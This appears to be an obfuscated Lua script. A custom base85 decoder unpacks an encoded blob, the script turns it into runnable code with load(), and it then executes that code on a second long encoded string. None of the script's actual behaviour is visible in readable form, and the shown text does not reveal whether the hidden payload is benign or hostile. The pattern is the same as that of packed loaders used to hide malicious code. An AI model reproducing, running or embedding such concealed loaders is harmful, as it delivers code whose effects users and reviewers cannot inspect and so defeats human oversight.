
local function hZbcytNFIc(s)
    local m = {}
    local c = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~"
    for i=1,85 do m[string.byte(c,i)] = i-1 end
    local o, v, n, p = {}, 0, 0, {52200625, 614125, 7225, 85, 1}
    for i=1, #s do
        local x = m[string.byte(s,i)]
        if x then
            v = v + x * p[n+1]
            n = n + 1
            if n == 5 then
                table.insert(o, string.char(math.floor(v/16777216), math.floor((v%16777216)/65536), math.floor((v%65536)/256), v%256))
                v, n = 0, 0
            end
        end
    end
    return table.concat(o)
end
local vm_func = load(hZbcytNFIc("3T$s<VQe6EP;XCqV|Q3$cpyC>b98cPZf7oIXkl_FF*G+VGB+$XH7heREHgDLGBGSUGAlAPEHN`HG%zeNF)=MOG%PVNI4v|XEHpSPGBzwRGB+(VIV?CfEiy1HHZ?0THY_nTFfB4QEHXGNGB7MRGAlGOEHN@LEiy4IG&n0UI4n0cEiyAKG&w6XIV?9bEiyGMGBGPNHY_nRF)cDMEHyJLF*qzSGBGVOGAuDQGA%SSEHN`VEiyAKF*GtQGB+$WH7hhUEHN=REi^JLGdU|VIV?FhEi^GKG%zbNH7qnYD>64J3T$s<VQe5~b#7yHX>V>IZCY1FMQUwWL`NuLEMh4jY;R*>Y#?wfV?8k}FgqZ3XlZO^AYnc*AYpD~AYwi+AY^YKY;R*>Y#?%BEOKH!VI?vwVkI&=AZcbGa$$Zwa$+EKXk~67V?ARla3E!FWIG^XEMhEhJt$!<a$zYiGAt-!EplQhFET7}Dl$7DWo~3UAZcbGVLW0WbZBL6AYnaXAZ2c3J0N#xX>4U6VLmV*WN#pBZ)0I>AaY?nVI?v<AZcbGa$!C&AarPDZXjblV=HhVWo~3UAYm+UJt$!<a$zYiGAwW^GCLq;Ze%+ka%FUNa&91FJ0N9lWIGCMZ)0I>AZB%LV{~b6ZXj1|VM0t}Nmg@1C}b=kYbgpKARr)YZ)0I>Aafu+AbWivW^ZyJX+1D3GBq_IWN#pITWMWAX&_~8WC|c4ARugSV_|F{Y9KuzFbW_bARuOMav*6vFf1}PH6Ubf3LqdLARr(hAZj2zASh}eD<E@QX<Z;IAaitbX>MmOVtI6BC~GVrC}|)iAR}ujAS)m-DJdW&ATl*J3LqdLARr(hAah%3T`VATTWVb(Js@*iYF#WKb6aU$3LqdLAZ2c33LqdLAZ%}AVQe62EFf=nbSxlhAUz;3EFgP*EFdrnARr(hW^ZyJX=HdkF)Sb>WFTa33LqdLARr(hAZZ{yASh`dD<Cl`ASEC&H8u($ARr(hARr)WAUz-`Y9K2hb6aU$DIg^vGBq{|ARr(hARr(hb6aU$EFg1RYF!{bAah%4T`VATTWMViARr(hARr(hZ*_EABX4zdD=}RlJs@**a%pa7E@Nn6awu(DS4Bl?ZCFG{D06gjX>MmOVtI6BC}b=kX=HdQEFg1RD05qBT_7tUb6aX%DIg^vGBq|`DJcpdARr)RZe$7|ARr)eWps6NZXk4FVr*qDV{dL_VRR^Ob#y5TWo~2&a%FUNa&91Ib#7yHX>V>Qa9?6LH7N=pARr)YZ)0I>AZ=lAAUz;^eF`8TARugSV_|F{V`yP=b09q+A}}#BGc+|eH#j*#LPJDFMn_0VN=r;lPESx#Qd3k_R##YAT47>iWMyV&XlZI|Y;A6DaB*^Tbai%jczJpuBP1mzC@Cr{Ejv6tK0iQSUtoKDeSRVeARr(hW^ZyJX+1G4I5i+-Zy;@9a9eY9a%pa7E@F9fWhi54VRCaUX(?SGJs@c<F(74bWC|c4ARugSV_|F{Z*_DmAa-GFEFf+yAaEc(AbWi*ATTT-Ff1T@H8L_VFg7wZEFd;9G%+$YEFd>BGBqq9I5jLFF?|XkARr)SZ*m}MJuxgGBXD10I5i+-ZweqFARr(hARugSV_|F{b|5_<ZDDX*b98cPZf7oHd30qca9?6LH7p=$DP0O6ARr(hARr)VW*~MTbZBL63LqdLARr(hARr(hAa-GFAUz;<VQe5PAa)=sAaGl5D=}RPARr(hARr(hARr(hZXi7%ZXhclF$y3cARr(hARr(hARuXGAZ{Q%Js>q8bZBL63LqdLARr(hARr(hARr(hAar43Y-KKKZgXXFbSQ6ibSxlqbaH8KXD(xCVR9&KVRUFNW^8Y7awv9TY%ei3H#avjF*YeIAZ=lEXf9@KZ*OuaD0X3NB{4QPH#agdHYqPQH8nFfDJ&puVRUFNW^8Y7awsTvVQeKfH8nFfDK9cLHYqG1c42HKGBq|SDGDGUARr(hARr(hARr(hARu;OY%CydAUz;3EFdrnARr(hARr(hARr(hWo~2&ARr(hARr(hWo~2&ARr(hWo~2&ARr(hY;R*>Y#?%Fb09q+S8QQIOk+t_b3-U}VPb4$E@N+QV_|eCZ*_DjEFg7IZ%=w-cUWS0DGDGUARugSV_|F{W*|KvY;R#?C~{?UDGDGUARuXGAZ8$RXk~67W+*8jWo~2&Wo~2&"))
if vm_func then vm_func()("2ZK4;?3IWV9c2W)7<ENPsXCpdbgk9tUZnQ(F9_vZl>HI{_dV%=s~ewfB6e^Gg!{VSuIp-N3xCdQ*<en||9tHBCdLE`^8WD25n2wAzk;}#G=~vzKyo;H??$K4ah{3;_`5V;Z~R=GQ*tE^m{^NLRp?X&DnLI_u7Wv=^wUmxzl;!B0y&_Tk$#J<NawCr>Zaye5X^xfn)(?LZ(;7m<V1n4QfEYu$Ie9I<QWnjIpzk-ZQ?&)Gox6Q+&&UV=TE$dH^(k;d0DW4rbWT*VerQZlml<F!=)lRUQ0sPCUqqvn0jV-YhJ_rmkY?-gF4r%P*6N%NT4G-(Mbak&j7>J=|0n-qh4H)wo-%niy(3ckKWC7m#&gtbiYU)B~NJ5-Py^MJBP&_#!ZzA*Af$cto7i$*JGOuGJKkdtsc6ZLjrY_2_nhV;0yU?^9QE^rRo&+xyIHSzGD=_*S~_pi2;aBT`-rxZ)}%47SX>9_JoJL`?}%cjQtIQ1getzFKaFONf6ywNHAX!`I<T-KNO&1EA2*oIg4EANM>?kCSl1Q@$X_NEjrHeaeZZ{B_(gy)!N5>y&B3AZ>E;w+47O!9aHmoiXCfq@KAWCH0E;=38K%b;RLqoQ9HUrr(46uvyUK!p}~H8z9Pi%Oiz<w>c??*Me78`anOIiF+n(DmygE{`pWmv_s7U%e>Q;ZPeWuL0c%2FxGFZ!C8@u-oOIg-Ko}x8@8kIa<W*`n_>u8G+qEBu25C(t?3)=~@4hZB(%He>WK%CqH-N3duTGqUbGm#;p9$16+seSWs_#6Rwlb{lH1JM7`9`6<^~Wn>7`GQu?(?KY?^g3;MB<!~-xb!oJq-OrbRON2IQPcdYdMXq<<*TxbCx8kp?s!BtxDH*O0q@B!o}S=So6E}Qlp)gFxw)fXb_9yH^J!scDVS`Tm") end
